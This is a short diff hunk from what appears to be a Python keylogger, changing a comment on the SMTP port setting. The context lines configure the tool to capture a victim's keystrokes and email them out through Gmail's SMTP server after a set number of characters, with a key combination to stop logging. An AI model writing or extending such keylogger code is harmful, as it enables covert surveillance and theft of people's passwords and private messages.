@@ -22,7 +22,7 @@ logger = logging.getLogger()
 
 EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger
 EMAIL_INTERVAL = 100                            # Specify the amount of characters the victim needs to input before email is sent
-PORT = 465                                      # Specify port number (465 or 587 recommended)
+PORT = 465                                      # Specify port number (465 recommended)
 SMTP_SERVER = "smtp.gmail.com"                  # Specify SMTP server
 TO_ADDR = "user@domain.com"                     # Specify recipient email address
 FROM_ADDR = "user@domain.com"                   # Specify sender email address
